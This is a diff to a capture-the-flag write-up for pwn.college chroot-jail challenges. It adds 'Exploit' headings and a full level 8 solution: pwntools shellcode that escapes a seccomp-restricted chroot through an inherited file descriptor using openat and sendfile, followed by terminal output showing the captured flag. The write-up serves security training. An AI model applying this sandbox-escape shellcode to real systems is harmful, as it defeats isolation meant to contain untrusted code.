@@ -247,6 +247,8 @@ However, we cannot pass an argument containing `flag`.
 
 Let's create a script which will read the the flag and print it out for us.
 
+### Exploit
+
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
@@ -514,6 +516,8 @@ flag:
 
 Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.
 
+### Exploit
+
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
@@ -767,6 +771,8 @@ int main(int argc, char **argv, char **envp)
 
 Since we can use the following syscalls: `openat`, `read`, `write`, `sendfile`, we can just use the slver script from the previous challenge.
 
+### Exploit
+
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
@@ -797,7 +803,7 @@ shellcode_asm = """
     syscall
 
 flag:
-    .string "../../flag"
+    .string "flag"
 """
 
 # Start challenge (argv[1] can be anything without "flag")
@@ -1053,6 +1059,8 @@ A hard link is an entry that associates a name with a file.
 This allows us to access `/flag` inside of `/tmp/jail/` using a different name.
 
 We can pass `olddrifd` to `3`, as it was the last file descriptor which was opened. As for `newdirfd`, we can set it to `AT_FDCWD` so that it ignores the the file descriptor, and uses the current working directory.
+
+### Exploit
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
@@ -1353,6 +1361,8 @@ This challenge opens the file / directory that we pass as an argument, and store
 
 Since, this is done before `chroot`, we can jump out of sandbox using the file descriptor.
 
+### Exploit
+
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
@@ -1646,6 +1656,8 @@ It then originally sets the root to `/tmp/jail-XXXXXX`.
 We can use the file descriptor from the argument to make a new directory within `/tmp/jail-XXXXXX`, and then `chroot` to that child directory.
 Thus, we would effectively escape the jail.
 
+### Exploit
+
 ```py title="~/script.py" showLineNumbers
 ffrom pwn import *
 
@@ -1918,3 +1930,109 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
+This time the challenge does not accept any arguments.
+
+We will have to open the directory in the shell itself and then pass use the file descriptor.
+This is possible because the child (`/challenge/babyjail_level8.c`) inherits the file descriptors of the parent (shell).
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "error"
+
+shellcode = asm(r"""
+    /* openat(3, "flag", O_RDONLY) */
+    mov rdi, 3
+    lea rsi, [rip + path]
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, 257
+    syscall
+
+    /* sendfile(1, fd, 0, 0x100) */
+    mov rdi, 1
+    mov rsi, rax
+    xor rdx, rdx
+    mov r10, 0x100
+    mov rax, 40
+    syscall
+
+    /* exit */
+    xor rdi, rdi
+    mov rax, 60
+    syscall
+
+path:
+    .string "flag"
+""")
+
+# Send raw shellcode to stdin (the running challenge)
+import sys
+sys.stdout.buffer.write(shellcode)
+```
+
+```
+hacker@sandboxing~seccomp-only:~$ exec 3</; python ~/script.py | /challenge/babyjail_level8
+###
+### Welcome to /challenge/babyjail_level8!
+###
+
+This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
+jail, not the real flag file outside of it. If you want the real flag, you must escape.
+
+You may upload custom shellcode to do whatever you want.
+
+For extra security, this challenge will only allow certain system calls!
+
+Creating a jail at `/tmp/jail-yAZGLu`.
+Moving the current working directory into the jail.
+
+Mapped 0x1000 bytes for shellcode at 0x1337000!
+Reading 0x1000 bytes of shellcode from stdin.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
+0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
+0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
+0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
+0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
+0x000000000133701b | 0f 05                                         | syscall 
+0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
+0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
+0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
+0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
+0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
+0x0000000001337038 | 0f 05                                         | syscall 
+0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
+0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
+0x0000000001337044 | 0f 05                                         | syscall 
+0x0000000001337046 | 66 6c                                         | insb byte ptr [rdi], dx
+
+Restricting system calls (default: kill).
+
+Allowing syscall: openat (number 257).
+Allowing syscall: read (number 0).
+Allowing syscall: write (number 1).
+Allowing syscall: sendfile (number 40).
+Executing shellcode!
+
+pwn.college{ccdGbakxPdlRLB00-I_4w9qq897.0FOzIDL4ITM0EzW}
+Bad system call            python ~/script.py | /challenge/babyjail_level8
+```
+
+&nbsp;
+
+## seccomp-arch32
+
+> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["close", "stat", "fstat", "lstat"]
+
+```c title="/challenge/babyjail_level9.c" showLineNumbers
+
+```
